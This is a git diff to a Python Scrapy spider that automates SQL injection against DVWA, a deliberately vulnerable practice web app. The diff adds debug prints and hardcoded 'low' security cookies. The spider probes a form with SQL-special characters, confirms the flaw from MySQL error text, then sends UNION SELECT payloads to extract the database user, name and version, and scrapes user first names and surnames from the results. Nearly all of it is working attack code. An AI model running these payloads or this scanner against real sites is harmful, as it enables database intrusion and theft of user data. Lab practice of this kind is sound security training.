@@ -44,11 +44,13 @@ class DVWASpider(Spider):
     def vulnerability_scan(self, response):
 
         for sql_char in self.sqli_characters:
+            print("In loop. Char - {}".format(sql_char))
             return scrapy.FormRequest.from_response(
                 response,
                 formdata={'id': sql_char,
                           'Submit': 'Submit'},
-                cookies={DVWA_SECURITY_KEY: DVWA_SECURITY_VALUE}
+                cookies={'security': 'low'},
+                callback=self.scan_results
             )
 
     def scan_results(self, response):
@@ -56,10 +58,13 @@ class DVWASpider(Spider):
         confirm_vuln = "You have an error in your SQL syntax;"
         print(response.text)
         if confirm_vuln.lower() in response.text.lower():
-            launch_payload = scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
-                                    callback=self.payloads)
-            launch_payload.cb_kwargs['type'] = "users"
-            return launch_payload
+            # launch_payload = scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
+            #                                 callback=self.payloads)
+            # launch_payload.cb_kwargs['type'] = "users"
+            print("Vulnerable")
+            return scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
+                                  callback=self.payloads,
+                                  cookies={'security': 'low'})
         else:
             return scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
                                   callback=self.vulnerability_scan,
@@ -69,7 +74,7 @@ class DVWASpider(Spider):
         payloads = ["%' or 0=0 union select null, user() #",
                     "%' or 0=0 union select null, database() #",
                     "%' or 0=0 union select null, version() #"]
-
+        print("Im in payloads")
         if not type:
             yield scrapy.FormRequest.from_response(
                 response,
@@ -88,13 +93,13 @@ class DVWASpider(Spider):
 
     def parse_users(self, response):
         results = response.body
-        soup = BeautifulSoup(results)
+        soup = BeautifulSoup(results, features="lxml")
         for tag in soup.findAll('pre'):
             _, firstname_field, surname_field = tag.prettify().split('<br/>')
             firstname = firstname_field.replace('First name: ', '')
             surname = surname_field.replace('Surname: ', ''.replace('</pre>', '').strip())
             item = DvwacrawlerItem()
-            item['firstname'] = firstname
+            item['first_name'] = firstname
             item['surname'] = surname
             yield item
 
